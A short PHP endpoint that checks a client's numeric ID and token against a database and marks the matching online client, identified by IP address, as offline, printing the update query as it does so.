<?php
ini_set('display_errors',0);
include "../include/config.inc.php";
include "./include/global.func.php";

    $DroneID = intval($_GET['id']);
	$Uniqu   = intval($_GET['uniqu']);

    $db = connect_db($mysql_ini);
    if (!$db){
    
	}else{	    
		$query = "select flag from ".$mysql_ini['prefix']."online_mac where cid=$DroneID limit 1";
		$result = $db->query($query);
        if (1 === mysqli_num_rows($result)){
			$result = $result->fetch_assoc();
			if ($Uniqu === intval($result['flag'])){
                $query = "update ".$mysql_ini['prefix']."online_clients set status = 0 where cid=$DroneID and ip='".$_SERVER["REMOTE_ADDR"]."' limit 1";	
				
				$db->query($query);
				var_dump ($query);
			}
		}
	}
	exit;

?>